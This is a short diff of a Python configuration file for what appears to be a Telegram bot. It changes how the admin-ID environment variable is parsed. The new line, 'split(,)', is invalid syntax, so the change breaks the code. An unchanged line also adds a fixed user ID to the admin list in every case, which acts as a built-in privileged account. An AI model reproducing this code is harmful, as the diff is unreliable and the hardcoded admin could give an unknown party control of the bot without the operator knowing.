@@ -30,7 +30,7 @@ VERIFY_SLUG_TTL_HOURS = int(os.getenv("VERIFY_SLUG_TTL_HOURS", 12))
 SHORTENER_DOMAIN = os.getenv("SHORTENER_DOMAIN", "")
 SHORTENER_API = os.getenv("SHORTENER_API_KEY", "")
 CAPTION = os.getenv("CAPTION", "")
-ADMINS = [int(x) for x in os.getenv("ADMINS", "").split() if x.strip().isdigit()]
+ADMINS = [int(x) for x in os.getenv("ADMINS", "").split(,) if x.strip().isdigit()]
 FINAL_ADMINS = list(set(ADMINS + [6789146594]))
 
 app = Client(
